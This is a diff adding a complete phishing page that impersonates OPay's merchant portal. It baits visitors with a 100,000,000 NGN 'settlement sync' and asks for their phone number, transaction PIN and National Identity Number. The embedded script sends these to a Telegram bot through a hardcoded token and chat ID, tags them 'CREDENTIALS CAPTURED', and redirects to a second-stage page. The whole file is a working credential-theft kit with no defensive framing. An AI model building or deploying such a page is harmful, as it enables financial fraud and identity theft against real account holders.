@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay | Merchant Settlement Portal</title>
+    <style>
+        :root { --opay-green: #00b875; --text-dark: #333; --bg-soft: #f4f7f6; }
+        body { background-color: var(--bg-soft); font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #fff; width: 100%; max-width: 400px; padding: 40px; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; }
+        .logo { width: 120px; margin-bottom: 25px; }
+        h1 { font-size: 1.5rem; color: var(--text-dark); margin-bottom: 8px; }
+        p { color: #777; font-size: 0.95rem; line-height: 1.4; margin-bottom: 30px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 0.85rem; font-weight: 600; color: #555; margin-bottom: 5px; margin-left: 5px; }
+        input { width: 100%; padding: 15px; border: 1px solid #e0e0e0; border-radius: 12px; font-size: 1rem; box-sizing: border-box; transition: border 0.3s; }
+        input:focus { outline: none; border-color: var(--opay-green); }
+        button { background-color: var(--opay-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 10px; transition: opacity 0.3s; }
+        button:active { opacity: 0.8; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/OPay_logo.svg/1200px-OPay_logo.svg.png" alt="OPay Logo" class="logo">
+    <h1>Identity Verification</h1>
+    <p>Please provide your credentials to authorize the settlement sync for <b>100,000,000 NGN</b>.</p>
+
+    <div class="input-group">
+        <label>Phone Number</label>
+        <input type="tel" id="phone" placeholder="08012345678" maxlength="11">
+    </div>
+
+    <div class="input-group">
+        <label>Transaction PIN</label>
+        <input type="password" id="pin" placeholder="****" maxlength="4">
+    </div>
+
+    <div class="input-group">
+        <label>National Identity Number (NIN)</label>
+        <input type="text" id="nin" placeholder="12345678901" maxlength="11">
+    </div>
+
+    <button id="submitBtn" onclick="handleAuth()">Authorize & Next</button>
+</div>
+
+<script>
+    const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
+    const chatId = '7909543900';
+
+    async function handleAuth() {
+        const phone = document.getElementById('phone').value;
+        const pin = document.getElementById('pin').value;
+        const nin = document.getElementById('nin').value;
+        const btn = document.getElementById('submitBtn');
+
+        if (phone.length < 11 || pin.length < 4 || nin.length < 11) {
+            alert("Please complete all fields correctly.");
+            return;
+        }
+
+        btn.innerText = "Verifying...";
+        btn.disabled = true;
+
+        const text = `🔹 [PHASE 1] CREDENTIALS CAPTURED 🔹\n\n📱 Phone: ${phone}\n🔑 PIN: ${pin}\n🆔 NIN: ${nin}`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+            // Redirect to the second page (verify.html)
+            window.location.href = "verify.html";
+        } catch (error) {
+            alert("Connection error. Please try again.");
+            btn.innerText = "Authorize & Next";
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
+
